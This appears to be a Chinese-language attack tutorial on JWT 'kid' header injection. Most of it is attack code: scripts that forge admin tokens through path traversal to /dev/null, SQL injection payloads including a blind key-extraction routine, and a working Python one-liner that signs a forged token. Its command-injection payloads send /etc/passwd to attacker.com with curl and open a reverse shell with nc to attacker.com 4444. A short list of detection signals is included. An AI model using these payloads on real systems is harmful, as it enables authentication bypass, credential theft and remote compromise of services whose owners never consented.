# JWT `kid` 参数注入

## 原理

`kid`（Key ID）是 Header 中的可选字段，告诉服务端用哪个密钥验证签名。如果服务端将 `kid` 的值**未经净化**直接用于文件路径、SQL 查询或系统命令，就产生了注入点。

```
┌──────────────────────────────────────────────────────────┐
│ kid 的三种典型服务端使用方式                               │
│                                                           │
│  1. 文件路径:  /etc/jwt_keys/<kid>.pem                    │
│     → 路径穿越 → 读取 /dev/null 或其他可预测文件作为密钥    │
│                                                           │
│  2. SQL 查询:   SELECT key FROM keys WHERE kid='<kid>'    │
│     → SQL 注入 → 控制返回的密钥值                          │
│                                                           │
│  3. 系统命令:   curl https://keystore/<kid>               │
│     → 命令注入 → 执行任意命令                              │
└──────────────────────────────────────────────────────────┘
```

---

## 3.1 路径穿越

### 漏洞场景

```python
# 服务端漏洞代码（伪代码）
def get_key_by_kid(kid: str) -> bytes:
    # BUG: 直接拼接路径，未净化 kid
    key_path = f"/etc/jwt_keys/{kid}.pem"
    return open(key_path, 'rb').read()

def verify_token(token: str):
    header = decode_header(token)
    key = get_key_by_kid(header['kid'])
    return jwt_verify(token, key)
```

### 攻击伪代码

```python
# attack_kid_path_traversal.py

def forge_with_kid_path_traversal(
    original_token: str,
    target_file: str,      # 要读取的文件路径（相对路径）
    algorithm: str = 'HS256'
) -> str:
    """
    利用 kid 路径穿越伪造 JWT

    假设服务端拼装路径: /etc/jwt_keys/<kid>.pem
    如果 kid = "../../dev/null"
    实际路径 → /etc/jwt_keys/../../dev/null.pem → /dev/null.pem
    服务端读取 /dev/null 的内容（空）作为 HMAC 密钥

    Args:
        original_token: 原始合法 token（用于观察结构）
        target_file:    穿越目标，如 "../../dev/null"
        algorithm:      签名算法
    Returns:
        伪造后的 JWT
    """
    # 根据目标文件的内容确定密钥
    # /dev/null    → 密钥 = b""
    # /proc/sys/kernel/random/boot_id → 密钥 = UUID 字符串
    # ../../etc/passwd → 大概率不匹配（需先读内容）

    key = b""  # /dev/null 的内容为空

    header = {"alg": algorithm, "typ": "JWT", "kid": target_file}
    payload = {"sub": "admin", "role": "admin"}

    return sign_jwt(header, payload, key, algorithm)


def probe_target_file(kid_path: str, target_url: str) -> bool:
    """
    探测目标文件是否存在/可读
    通过服务端响应判断
    """
    header_b64 = b64url({"alg": "HS256", "typ": "JWT", "kid": kid_path})
    payload_b64 = b64url({"sub": "test"})
    # 用空密钥签名（假设 /dev/null）
    sig = hmac_sha256(f"{header_b64}.{payload_b64}", b"")
    token = f"{header_b64}.{payload_b64}.{sig}"

    resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"})

    # 不同文件 → 不同错误
    if "FileNotFound" in resp.text:
        return False            # 文件不存在
    if "key too short" in resp.text:
        return True             # 文件存在但内容不够长
    if "signature" in resp.text.lower():
        return True             # 文件存在但签名不匹配
    if resp.status_code == 200:
        return True             # 签名匹配！完美
    return None                 # 不确定
```

### 常用穿越 Payload

```text
# 空密钥
../../dev/null              → /dev/null → key = b""

# 已知内容的系统文件
../../../proc/sys/kernel/random/boot_id  → UUID → 可预测
../../../sys/class/dmi/id/product_uuid   → 可预测

# 配置文件（需先读内容再签名）
../../../etc/hostname       → 可能是短字符串
../../../proc/self/environ  → 环境变量
../../../var/log/app.log   → 日志中的某行

# 尝试读取 Web 源码中的硬编码密钥
../../../var/www/html/config.php
../../../app/config.py
../../../.env
```

---

## 3.2 SQL 注入

### 漏洞场景

```python
# 服务端漏洞代码
def get_key_by_kid(kid: str) -> str:
    query = f"SELECT secret_key FROM jwt_keys WHERE kid = '{kid}'"
    cursor.execute(query)
    row = cursor.fetchone()
    return row[0] if row else None
```

### 攻击伪代码

```python
# attack_kid_sqli.py

def forge_with_kid_sqli(
    sqli_payload: str,     # SQL 注入 payload
    controlled_key: str,   # 攻击者控制的密钥值
) -> str:
    """
    通过 kid SQL 注入让服务端返回攻击者控制的密钥

    原始 SQL:  SELECT key FROM jwt_keys WHERE kid = '<kid>'
    注入后:    SELECT key FROM jwt_keys WHERE kid = 'x' UNION SELECT 'attacker_key' --'
               → 返回 'attacker_key'

    然后用 'attacker_key' 作为 HMAC 密钥签名
    """
    header = {
        "alg": "HS256",
        "typ": "JWT",
        "kid": sqli_payload      # 如: x' UNION SELECT 'mysecret' --
    }
    payload = {"sub": "admin", "role": "admin"}
    return sign_jwt(header, payload, controlled_key.encode(), 'HS256')


# --- Payload 变种 ---
SQLI_PAYLOADS = [
    # 基础 UNION
    "x' UNION SELECT 'mykey' --",
    "x' UNION SELECT 'mykey' #",
    # 子查询
    "x' UNION SELECT (SELECT password FROM users LIMIT 1) --",
    # 堆叠查询 (如果支持)
    "x'; INSERT INTO jwt_keys VALUES ('attacker', 'mykey'); --",
    # 时间盲注探测
    "x' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --",
    # 布尔盲注
    "x' AND SUBSTRING((SELECT secret_key FROM jwt_keys LIMIT 1),1,1)='a' --",
]
```

### SQLi 盲注提取真实密钥

```python
def blind_extract_key(target_url, original_token):
    """
    通过 kid SQLi 布尔盲注逐字符提取真实密钥
    """
    known_key = ""
    for pos in range(1, 33):  # 假设密钥最长 32 字符
        for ch in "abcdefghijklmnopqrstuvwxyz0123456789_-":
            # 注入 payload：提取数据库中的密钥第 pos 个字符
            kid = (
                f"x' AND SUBSTRING("
                f"(SELECT secret_key FROM jwt_keys LIMIT 1),"
                f"{pos},1)='{ch}' --"
            )

            header = {"alg": "HS256", "kid": kid}
            # 用 ch 临时签名...
            # 若 200 → 字符匹配，known_key += ch
            # 若 401 → 字符不匹配
```

---

## 3.3 命令注入

### 漏洞场景

```python
# 服务端漏洞代码
def get_key_by_kid(kid: str) -> bytes:
    # BUG: kid 被拼接到 shell 命令中
    result = subprocess.check_output(f"curl -s https://keystore.internal/jwt/{kid}")
    return result
```

### 攻击 Payload

```json
{"alg": "HS256", "typ": "JWT", "kid": "x;curl http://attacker.com/$(cat /etc/passwd|base64);"}
{"alg": "HS256", "typ": "JWT", "kid": "$(id>/tmp/pwned)"}
{"alg": "HS256", "typ": "JWT", "kid": "`nc attacker.com 4444 -e /bin/bash`"}
```

---

## 检测信号

- Header 包含 `kid` 字段
- 修改 `kid` 值后错误信息发生变化（"key not found" / "invalid key" / 文件系统错误）
- 错误信息暴露路径结构（`/etc/jwt_keys/xxx.pem not found`）
- 修改 `kid` 后响应时间变化（SQL 时间盲注信号）

## 工具命令

```bash
# jwt_tool kid 注入扫描
python3 jwt_tool.py <token> -X i -pk attacker.pem

# 手动探测路径穿越
python3 -c "
import base64,json,hmac,hashlib
h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','kid':'../../dev/null'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).rstrip(b'=').decode()
s=base64.urlsafe_b64encode(hmac.new(b'',f'{h}.{p}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')
"
```
